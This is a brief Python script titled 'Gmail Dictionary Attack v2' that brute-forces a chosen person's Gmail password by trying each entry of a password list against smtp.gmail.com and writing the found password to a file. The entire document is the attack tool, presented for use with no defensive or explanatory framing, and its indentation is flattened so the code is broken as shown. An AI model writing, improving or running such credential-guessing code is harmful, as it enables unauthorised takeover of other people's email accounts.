# Program: Gmail Dictionary Attack v2
# Author: Sparta-9
# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS.

import smtplib
import pathlib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter the target's email address: ")
pathlib.Path("email.txt").write_text("%s" % user)
passwfile = input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
try:
smtpserver.login(user, password)
print("+ Password Found: %s" % password)
pathlib.Path("password.txt").write_text("The pass is %s" % password)
exit()

except smtplib.SMTPAuthenticationError:
print("! Password Incorrect: %s" % password)
